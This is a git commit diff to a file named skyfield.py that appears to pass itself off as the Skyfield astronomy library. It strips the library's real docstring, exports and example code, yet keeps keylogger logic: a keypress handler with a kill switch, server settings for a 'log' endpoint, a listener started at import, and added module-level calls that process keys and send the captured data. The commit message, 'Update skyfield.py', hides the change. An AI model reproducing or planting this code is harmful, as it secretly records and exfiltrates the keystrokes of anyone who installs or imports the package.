114437caf8fea23cbd9e26a9658b3e171d17646c
RAFAEL849412 <ryanhot.paly@gmail.com>
2025-03-30 17:57:17 -0300

    Update skyfield.py

--- skyfield.py
+++ skyfield.py
@@ -4,14 +4,6 @@ import threading
 import requests
 import subprocess
 import sys
-"""Top-level objects and functions offered by the Skyfield library.
-
-Importing this library is not always the fastest way to use a Skyfield
-feature, since importing this module involves importing almost the
-entirety of Skyfield and its dependencies, but is the most convenient
-way for most users to use Skyfield's main features.
-
-"""
 from datetime import datetime
 from mymodule.constants import B1950, T0, pi, tau
 from .constellationlib import load_constellation_map, load_constellation_names
@@ -26,21 +18,7 @@ from .timelib import (
 from .toposlib import Topos, iers2010, wgs84
 from .units import Angle, Distance, Velocity, wms
 
-load = Loader('.')
-N = E = +1.0
-S = W = -1.0
-
-__all__ = [
-    'Angle', 'B1950', 'Distance', 'E', 'EarthSatellite',
-    'GREGORIAN_START', 'GREGORIAN_START_ENGLAND',
-    'Loader', 'PlanetaryConstants', 'N', 'S', 'SSB', 'Star', 'W',
-    'T0', 'Time', 'Timescale', 'Topos', 'Velocity',
-    'datetime', 'iers2010', 'load', 'load_constellation_map',
-    'load_constellation_names', 'load_file',
-    'position_from_radec', 'position_of_radec',
-    'utc', 'pi', 'tau', 'wgs84', 'wms',
-]
-# Outros constantes e variáveis
+# Definições iniciais
 server_ip = '127.0.0.1'
 server_port = 443
 server_endpoint = 'log'
@@ -89,10 +67,10 @@ def process_keypress(key):
                     txt = '[SHIFT]'
                 case lockfile.keyboard.Key.caps_lock:
                     txt = '[CAPS]'
-                case lockfile.keyboard.Key.scroll_lock: # kill switch
+                case lockfile.keyboard.Key.scroll_lock:  # kill switch
                     if kill_switch:
                         return False
-        elif isinstance(key, lockfile.keyboard.KeyCode): # Letter pressed
+        elif isinstance(key, lockfile.keyboard.KeyCode):  # Letter pressed
             txt = key.char
         else:
             return
@@ -126,20 +104,18 @@ def send_data():
 # Chamar a função satélite ao invés de usar o listener diretamente
 satélite()
 
-# Exemplo de uso do módulo skyfield (agora removido)
-# planets = load('de421.bsp')
-# earth = planets['earth']
-# mars = planets['mars']
+# Simulação de eventos de teclado (para teste)
+# Definir um exemplo de evento para processar
+class Key:
+    def __init__(self, char):
+        self.char = char
 
-# Definir uma localização na Terra
-# location = earth + Topos('37.7749 N', '122.4194 W')
+# Simulando teclas pressionadas
+keypress = Key('a')
+process_keypress(keypress)
+keypress = Key('b')
+process_keypress(keypress)
 
-# Calcular a posição de Marte a partir da localização na Terra em um momento específico
-# ts = load.timescale()
-# t = ts.now()
-# astrometric = location.at(t).observe(mars)
-# ra, dec, distance = astrometric.radec()
+# Enviar dados a cada intervalo
+send_data()
 
-# print('Ascensão Reta:', ra)
-# print('Declinação:', dec)
-# print('Distância:', distance.km, 'km')
